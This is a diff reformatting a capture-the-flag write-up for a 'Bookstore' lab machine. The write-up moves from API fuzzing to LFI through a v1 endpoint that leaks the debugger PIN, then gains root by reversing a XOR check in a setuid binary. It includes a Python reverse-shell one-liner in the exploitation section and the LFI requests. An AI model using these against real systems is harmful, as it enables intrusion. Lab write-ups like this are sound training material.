@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f4d6
 ---
+# ENUMERATION
+---
 
-# BOOKSTORE
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 | 5000 | HTTP    |
@@ -44,19 +42,25 @@ PORT     STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
 
-***
+# RECONNAISSANCE
+---
 
 As we can see, we got `robots.txt` and `api` on port `5000`, let's check both websites then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509112440.png)
+
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509112440.png)
 
 On the `login.html` source code, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509114339.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509113014.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509114339.png)
+
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509113014.png)
 
 Let's fuzz:
 
@@ -87,13 +91,19 @@ api                     [Status: 200, Size: 825, Words: 82, Lines: 12, Duration:
 console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 183ms]
 ```
 
+
 We got console:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509114528.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509114528.png)
+
+
+
+
 
 We already know we are dealing with `REST API`, if we go to `/api`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509113535.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509113535.png)
+
 
 We got the documentation of the api, we got some routes we can analyze, if we go with:
 
@@ -115,7 +125,8 @@ We can see this:
 ]
 ```
 
-As seen, the `id` parameter has got , if we try using curl in the following way, it still works:
+
+As seen, the `id` parameter has got `\n`, if we try using curl in the following way, it still works:
 
 ```json
 curl "http://10.10.254.203:5000/api/v2/resources/books?id=38%0A"
@@ -130,13 +141,17 @@ curl "http://10.10.254.203:5000/api/v2/resources/books?id=38%0A"
 ]
 ```
 
+
 I tried `command injection` and `LFI` but it didn't work, that's when i thought that maybe there was a `v1` of the `api`, if its true, then, this may be vulnerable to `LFI`, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
+
+# EXPLOITATION
+---
+
 
 Let's try to change the route to `v1` in the following way:
+
 
 ```
 "http://10.10.254.203:5000/api/v1/resources/books?id=.bash_history"
@@ -173,6 +188,7 @@ id                      [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 191
 published               [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 184ms]
 ```
 
+
 As seen, the `show` parameter has got a size of `116`, let's check it out:
 
 ```json
@@ -188,7 +204,7 @@ exit
 
 It works and we got the pin, let's go into `/console` then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509115547.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509115547.png)
 
 We got an interactive python console, let's send ourselves a reverse shell and check if it works:
 
@@ -196,17 +212,24 @@ We got an interactive python console, let's send ourselves a reverse shell and c
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509115732.png)
+
+
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509115732.png)
+
 
 If we check our listener:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509115746.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509115746.png)
 
 There we go, let's proceed to privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 First step is to stabilize our shell:
 
@@ -220,21 +243,24 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509115852.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509115852.png)
 
 With our stable shell, we can now look around the machine, let's use linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509121448.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509121448.png)
 
 We got a `try-harder` binary owned by root on our home directory, let's check it out using `ghidra`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509121742.png)
 
-As seen, in the main function, we got an interesting finding, The binary checks if our input satisfies the equation:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509121742.png)
+
+As seen, in the main function, we got an interesting finding, The binary checks if our input satisfies the equation:  
+
 
 ```c
 (input ^ 0x1116 ^ 0x56b3) = 0x56c021f4
 ```
+
 
 If it does, we will get a shell as root, the program XORs the user input with two hardcoded constants and compares it to a known value. let's automate the process of getting the magic number with this python script:
 
@@ -258,7 +284,7 @@ python3 magic_number.py
 
 We got our magic number, let's get our root shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509122835.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509122835.png)
 
 Nice, we can finally read the root flag:
 
@@ -267,4 +293,6 @@ root@bookstore:~# cat /root/root.txt
 e29b05fba5b2a7e69c24a450893158e3
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250509122935.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250509122935.png)
+
+
